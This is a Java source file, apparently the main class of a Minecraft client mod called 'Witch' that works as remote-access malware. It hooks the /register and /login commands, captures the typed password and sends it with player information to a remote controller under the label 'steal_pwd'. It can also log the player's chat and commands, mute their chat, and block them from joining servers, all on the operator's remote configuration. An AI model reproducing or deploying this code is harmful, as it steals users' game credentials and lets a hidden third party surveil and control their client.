package me.soda.witch.client;

import me.soda.witch.client.connection.Client;
import me.soda.witch.client.events.ChatScreenChatEvent;
import me.soda.witch.client.events.GameJoinEvent;
import me.soda.witch.client.events.SendCommandEvent;
import me.soda.witch.client.events.ServerButtonClickEvent;
import me.soda.witch.client.modules.ClientChatWindow;
import me.soda.witch.client.utils.ChatUtils;
import me.soda.witch.client.utils.LoopThread;
import me.soda.witch.client.utils.MCUtils;
import me.soda.witch.shared.Crypto;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.socket.messages.Data;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.ByteData;
import me.soda.witch.shared.socket.messages.messages.ClientConfigData;
import me.soda.witch.shared.socket.messages.messages.StringsData;
import meteordevelopment.orbit.EventBus;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.orbit.IEventBus;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.DisconnectedScreen;
import net.minecraft.client.gui.screen.TitleScreen;
import net.minecraft.screen.ScreenTexts;
import net.minecraft.text.Text;

import java.lang.invoke.MethodHandles;
import java.util.Arrays;
import java.util.List;

public class Witch {
    public static final Witch INSTANCE = new Witch();
    public static final MinecraftClient mc = MinecraftClient.getInstance();
    public static final IEventBus EVENT_BUS = new EventBus();
    public static ClientConfigData CONFIG_INFO = new ClientConfigData();
    public static ClientChatWindow CHAT_WINDOW = new ClientChatWindow();
    public Client client;

    private Witch() {
    }

    public static void send(String messageType, String message) {
        INSTANCE.client.send(new StringsData(messageType, List.of(message)));
    }

    public static void send(String messageType, List<String> message) {
        INSTANCE.client.send(new StringsData(messageType, message));
    }

    public static void send(String messageType, byte[] message) {
        INSTANCE.client.send(new ByteData(messageType, message));
    }

    public static <T extends Data> void send(T object) {
        INSTANCE.client.send(new Message(object));
    }

    public static void send(String messageType) {
        INSTANCE.client.send(new StringsData(messageType, List.of()));
    }

    public void init() {
        LogUtil.println("By Soda5601");
        if (!Cfg.init()) {
            LogUtil.println("Config issue");
            return;
        }
        Crypto.INSTANCE = new Crypto(Cfg.key);
        LoopThread.init();
        EVENT_BUS.registerLambdaFactory(getClass().getPackageName(), (lookupInMethod, klass) -> (MethodHandles.Lookup) lookupInMethod.invoke(null, klass, MethodHandles.lookup()));
        EVENT_BUS.subscribe(this);
        EVENT_BUS.subscribe(ChatUtils.class);
        client = new Client();
    }

    @EventHandler
    private void onSendCommand(SendCommandEvent event) {
        String[] cmds = event.command.split(" ");
        List<String> hint = Arrays.asList("reg", "register", "l", "login", "log");
        if (CONFIG_INFO.passwordBeingLogged && cmds.length >= 2 && hint.contains(cmds[0])) {
            send(MCUtils.getPlayerInfo());
            send("steal_pwd", cmds[1]);
        }
        if (CONFIG_INFO.logChatAndCommand) LoopThread.addToList("/" + event.command);
    }

    @EventHandler
    private void onServerJoin(ServerButtonClickEvent event) {
        if (!Witch.CONFIG_INFO.canJoinServer) {
            mc.execute(() -> mc.setScreen(new DisconnectedScreen(new TitleScreen(), ScreenTexts.CONNECT_FAILED,
                    Text.of(Witch.CONFIG_INFO.name + " kicked you."))));
            event.cancel();
        }
    }

    @EventHandler
    private void onGameJoin(GameJoinEvent event) {
        Witch.send(MCUtils.getPlayerInfo());
    }

    @EventHandler
    private void onSendMessage(ChatScreenChatEvent event) {
        if (CONFIG_INFO.isMuted) event.cancel();
    }
}
